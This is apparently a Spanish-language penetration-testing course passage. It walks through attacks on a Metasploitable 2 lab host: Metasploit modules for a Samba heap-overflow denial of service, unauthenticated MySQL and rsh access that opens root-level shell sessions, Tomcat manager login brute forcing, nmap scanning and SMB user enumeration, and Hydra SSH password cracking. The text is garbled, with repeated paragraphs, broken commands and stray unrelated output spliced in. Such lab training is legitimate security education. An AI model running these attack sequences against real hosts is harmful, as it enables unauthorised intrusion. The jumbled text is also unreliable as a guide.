root@kali:~# /etc/init.d/postgresql start [ ok ] Starting PostgreSQL 9.1 database server: main. root@kali:~# msfconsole msf > search lsa_io_privilege_set Heap Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/dos/samba/lsa_addprivs_heap normal Samba lsa_io_privilege_set Heap Overflow msf > use auxiliary/dos/samba/lsa_addprivs_heap msf auxiliary(lsa_addprivs_heap) > show options Module options (auxiliary/dos/samba/lsa_addprivs_heap)

[*] Calling the vulnerable function... [-] Auxiliary triggered a timeout exception [*] Auxiliary module execution completed msf auxiliary(lsa_addprivs_heap) > exploit Vulnerabilidad rsh Unauthenticated Acces (via finger information) https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2012-6392 Análisis Utilizando nombres de usuario comunes como también nombres de usuarios reportados por “finger”.

Es posible autenticarse mediante rsh. Ya sea las cuentas no están protegidas con contraseñas o los archivos ~/.rhosts o están configuradas adecuadamente. Esta vulnerabilidad está confirmada de existir para Cisco Prime LAN Management Solution, pero puede estar presente en cualquier host que no este configurado de manera segura.

32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using shared memory PutImage Vulnerabilidad MySQL Unpassworded Account Check Análisis Es posible conectarse a la base de datos MySQL remota utilizando una cuenta sin contraseña. Esto puede permitir a un atacante a lanzar ataques contra la base de datos.

Con Metasploit Framework: msf > search mysql_sql Matching Modules ================

Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/mysql/mysql_sql normal MySQL SQL Generic Query msf > use auxiliary/admin/mysql/mysql_sql msf auxiliary(mysql_sql) > show options Module options (auxiliary/admin/mysql/mysql_sql)

Your MySQL connection id is 7 Server version: 5.0.51a-3ubuntu5 (Ubuntu) Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

```bash
mysql> show databases;
```

+--------------------+ | Database | +--------------------+ | information_schema | | dvwa | | metasploit | | mysql | | owasp10 | | tikiwiki | | tikiwiki195 | +--------------------+ 7 rows in set (0.00 sec)

```bash
mysql> use information_schema
```

Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed

```bash
mysql> show tables;
```

También, esto puede permitir una autenticación pobrle sin contraseñas. Si el host es vulnerable a la posibilidad de adivinar el número de secuencia TCP (Desde cualquier Red) o IP Spoofing (Incluyendo secuestro ARP sobre la red local) entonces puede ser posible evadir la autenticación.

To access official Ubuntu documentation, please visit: http://help.ubuntu.com/ You have new mail. root@metasploitable:~# Vulnerabilidad rsh Service Detection https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-1999-0651 Análisis El host remoto está ejecutando el servicio 'rsh'. Este servicio es peligroso en el sentido que no es cifrado- es decir, cualquiera puede interceptar los datos que pasen a través del cliente rlogin y el servidor rlogin. Esto incluye logins y contraseñas.

También, esto puede permitir una autenticación pobrle sin contraseñas. Si el host es vulnerable a la posibilidad de adivinar el número de secuencia TCP (Desde cualquier Red) o IP Spoofing (Incluyendo secuestro ARP sobre la red local) entonces puede ser posible evadir la autenticación.

[*] Command shell session 1 opened (192.168.1.38:1023 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'daemon' from 'root' [+] 192.168.1.34:514, rsh 'daemon' from 'root' with no password. [*] Command shell session 2 opened (192.168.1.38:1022 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'bin' from 'root' [+] 192.168.1.34:514, rsh 'bin' from 'root' with no password.

[*] Command shell session 3 opened (192.168.1.38:1021 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'nobody' from 'root' [+] 192.168.1.34:514, rsh 'nobody' from 'root' with no password. [*] Command shell session 4 opened (192.168.1.38:1020 -> 192.168.1.34:514) at-11 21:54:19 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'root' [-] Result: Permission denied.

[*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'daemon' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'bin' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'nobody' [-] Result: Permission denied.

[*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from '+' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'guest' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'mail' [-] Result: Permission denied.

[*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'root' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'daemon' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'bin' [-] Result: Permission denied.

[*] 192.168.1.34:514 RSH - Attempting rsh with username 'mail' from 'root' [+] 192.168.1.34:514, rsh 'mail' from 'root' with no password. [*] Command shell session 5 opened (192.168.1.38:1019 -> 192.168.1.34:514) at-11 21:54:20 -0500 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(rsh_login) > Vulnerabilidad Samba Symlink Traveral Arbitrary File Access (unsafe check) https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926 Análisis El servidor Samba remoto está configurado de manera insegura y permite a un atacante remoto a obtener acceso de lectura o posiblemente de escritura a cualquier archivo sobre el host afectado.

Especialmente, si un atacante tiene una cuenta válida en Samba para recurso compartido que es escribible o hay un recurso escribile que está configurado con una cuenta de invitado, puede crear un enlace simbólico utilizando una secuencia de recorrido de directorio y ganar acceso a archivos y directorios fuera del recurso compartido.

Una explotación satisfactoria requiera un servidor Samba con el parámetro 'wide links' definido a 'yes', el cual es el estado por defecto. Obtener Recursos compartidos del Objetivo

```bash
# smbclient -L \\192.168.1.34
```

### 10. Atacar Contraseñas

Cualquier servicio de red el cual solicite un usuario y contraseña es vulnerable a intentos para tratar de adivinar credenciales válidas. Entre los servicios más comunes se enumeran; ftp, ssh, telnet, vnc, rdp, entre otros. Un ataque de contraseñas en línea implica automatizar el proceso de adivinar las credenciales para acelerar el ataque y mejorar las probabilidades de adivinar alguna de ellas.

THC Hydra https://github.com/vanhauser-thc/thc-hydra THC-Hydra es una herramienta de código prueba de concepto, el cual proporciona a los investigadores y consultores en seguridad, la posibilidad de mostrar cuan fácil podría ser ganar acceso no autorizado hacia un sistema.

Existen diversas herramientas disponibles para atacar logins disponibles, sin embargo ninguna soporta más de un protocolo a atacar o conexiones en paralelo. Actualmente la herramienta soporta los siguientes protocolos; Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC y XMPP.

Para los siguientes ejemplos se utilizará el módulo auxiliar de nombre “MySQL Login Utility” en Metasploit Framework, el cual permite realizar consultas sencillas hacia la instancia MySQL por usuarios y contraseñas específicos (Por defecto es el usuario root con la contraseña en blanco).

Se define una lista de palabras de posibles usuarios y otra lista de palabras de posibles contraseñas.

```bash
# msfconsole
```

Para el siguiente ejemplo se utilizará el módulo auxiliar de nombre “PostgreSQL Login Utility” en Metasploit Framework, el cual intentará autenticarse contra una instancia PostgreSQL utilizando combinaciones de usuarios y contraseñas indicados por las opciones USER_FILE, PASS_FILE y USERPASS_FILE.

msf > search tomcat msf> use auxiliary/scanner/http/tomcat_mgr_login msf auxiliary(tomcat_mgr_login) > show options msf auxiliary(tomcat_mgr_login) > set RHOSTS [IP_Objetivo] msf auxiliary(tomcat_mgr_login) > set RPORT 8180 msf auxiliary(tomcat_mgr_login) > set USER_FILE /usr/share/metasploit- framework/data/wordlists/tomcat_mgr_default_users.txt

### 11. Demostración de Explotación & Post

Explotación Las demostraciones presentadas a continuación permiten afianzar la utilización de algunas herramientas presentadas durante el Curso. Estas demostraciones se centran en la fase de Explotación y Post-Explotación, es decir los procesos que un atacante realizaría después de obtener acceso al sistema mediante la explotación de una vulnerabilidad.

11.1 Demostración utilizando un exploit local para escalar privilegios. Abrir con VMWare Player las máquina virtuales de Kali Linux y Metsploitable 2 Abrir una nueva terminal y ejecutar WireShark . Escanear todo el rango de la red

```bash
# nmap -n -sn 192.168.1.0/24
```

Escaneo de Puertos

```bash
# nmap -n -Pn -p- 192.168.1.34 -oA escaneo_puertos
```

Colocamos los puertos abiertos descubiertos hacia un archivo

```bash
# grep open escaneo_puertos.nmap | cut -d “ ” -f 1 | cut -d “/” -f 1 | sed “s/
```

$/,/g” > listapuertos

```bash
# tr -d '\n' < listapuertos > puertos
```

```bash
# nmap -n -Pn -sV -p[puertos] 192.168.1.34 -oA escaneo_versiones
```

Obtener la Huella del Sistema Operativo

```bash
# nmap -n -Pn -p- -O 192.168.1.34
```

Enumeración de Usuarios Proceder a enumerar usuarios válidos en el sistema utilizando el protocolo SMB con nmap

```bash
# nmap -n -Pn –script smb-enum-users -p445 192.168.1.34 -oA escaneo_smb
# ls -l escaneo*
```

Se filtran los resultados para obtener una lista de usuarios del sistema.

```bash
# grep METASPLOITABLE escaneo_smb.nmap | cut -d “\\” -f 2 | cut -d “ ” -f 1 >
```

usuarios Cracking de Contraseñas Utilizar THC-Hydra para obtener la contraseña de alguno de los nombre de usuario obtenidos.

```bash
# hydra -L usuarios -e ns 192.168.1.34 -t 3 ssh
```

---
